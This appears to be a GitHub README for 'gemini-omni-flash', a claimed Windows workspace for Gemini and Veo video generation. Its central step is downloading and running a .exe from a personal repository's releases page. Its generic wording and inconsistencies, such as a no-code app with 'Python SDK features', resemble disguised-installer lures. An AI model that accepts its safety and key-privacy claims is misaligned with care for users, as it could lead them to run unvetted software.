# 🚀 gemini-omni-flash - Visual AI tools for rapid workflows

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/abarrios1486/gemini-omni-flash/releases)

gemini-omni-flash provides a workspace to use Google Gemini Omni, Gemini 3.5 Flash, and Veo 3.1 video generation. This tool simplifies how you create AI-powered storyboards and manage video production. It works as a visual workspace for your projects. You do not need to write code to use the main features.

## 📦 How to install the software

Follow these steps to set up the software on your Windows computer.

1. Visit the project download page: [https://github.com/abarrios1486/gemini-omni-flash/releases](https://github.com/abarrios1486/gemini-omni-flash/releases).
2. Look for the latest version under the "Assets" section.
3. Choose the file ending in `.exe` to download the installer.
4. Save the file to your computer.
5. Open the downloaded file to start the installation wizard.
6. Follow the prompts on your screen.
7. Click "Finish" when the installation completes.

## ⚙️ System requirements

Your computer needs specific hardware and software to run this application smoothly.

- Operating System: Windows 10 or Windows 11.
- Processor: A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 or better).
- Memory: 8 GB of RAM or more.
- Storage: 500 MB of space for the application files.
- Internet: An active connection for AI model processing and API communication.

## 🧠 Core features

The application includes several tools to help your video production workflow.

- Visual Storyboarding: Create storyboards for your video scripts. You see the layout before generating the final clips.
- Live Workspace Simulator: Test your prompts in real-time. This helps you refine your requests for Gemini Omni and Veo 3.1.
- Type-safe API Workflows: The application handles the connection requirements for you. You select the model, and the app manages the data exchange.
- Video Generation: Use the integrated Veo 3.1 engine to produce motion content from your text prompts.

## 🛠 Using the workspace

When you open the application, you see the main dashboard. This screen shows your current projects and saved storyboards.

To start a new project:
1. Click the "New Project" button in the top left corner.
2. Select your target AI model from the dropdown menu. You can choose between Gemini Omni for text and logic, or Veo 3.1 for video creation.
3. Enter your prompt in the text box. Be specific about the visual style, lighting, and movement you want.
4. Click "Generate" to send the request.
5. Review the output in the preview window. 

If you want to adjust the result, change your text prompt and click "Regenerate". The workspace keeps a history of your previous attempts on the right side of the screen. You can revert to an older version at any time.

## 📋 Managing API keys

The application connects to Google services using an API key. You need a key to generate content. 

1. Open the "Settings" menu inside the application.
2. Select the "API Configuration" tab.
3. Find your key from the Google AI Studio dashboard.
4. Paste the key into the provided field.
5. Click "Save".

The application stores this key locally on your computer. It never transmits your key to third-party servers.

## 💡 Best practices for video generation

High-quality video requires clear instructions. Use these tips when writing your prompts:

- Mention the camera angle. For example, use "close-up shot" or "wide angle view."
- Describe the setting. Include details like "sunlight," "rainy street," or "futuristic office."
- Define the action. Tell the AI what the subjects do throughout the video clip.
- Keep sequences simple. Smaller segments lead to higher consistency in video length and style.

## ❓ Frequently asked questions

Does the app require constant updates?
The app checks for updates when you launch it. We recommend installing the latest version to ensure you have the newest features and compatibility for the latest AI models.

Can I export my videos?
Yes. Click the "Export" button after generating a clip. You can save your video files in standard formats like MP4.

Is my data private?
The application processes data through your chosen model provider. Your local workspace folders remain on your hard drive. 

What if the application does not launch?
Make sure you have installed the latest version of the .NET Desktop Runtime from the official Microsoft website. This is a common requirement for Windows applications.

How do I report a problem?
Visit the GitHub repository and click the "Issues" tab. Provide a description of the error you see. Include screenshots if possible to help us understand the behavior.

## 📂 Project structure

The folders on your computer are organized for ease of use: 
- `workspace/`: Stores your current projects and saved storyboards.
- `exports/`: Contains all finished video clips you choose to save.
- `logs/`: Holds error reports for troubleshooting.

## 📜 License information

This project uses the standard open-source license provided in the root folder. You may use the software for your creative projects under these terms. Please review the `LICENSE` file for details on usage, distribution, and modification rights. 

## 🌐 Community and support

We welcome feedback on the visual workspace and the Python SDK features. If you find a bug or want to suggest a new tool, use the issues tracker on GitHub. We monitor these reports to fix bugs and improve the user experience for everyone. If you have questions about the logic of the API workflows, browse the documentation provided in the "Help" menu within the application.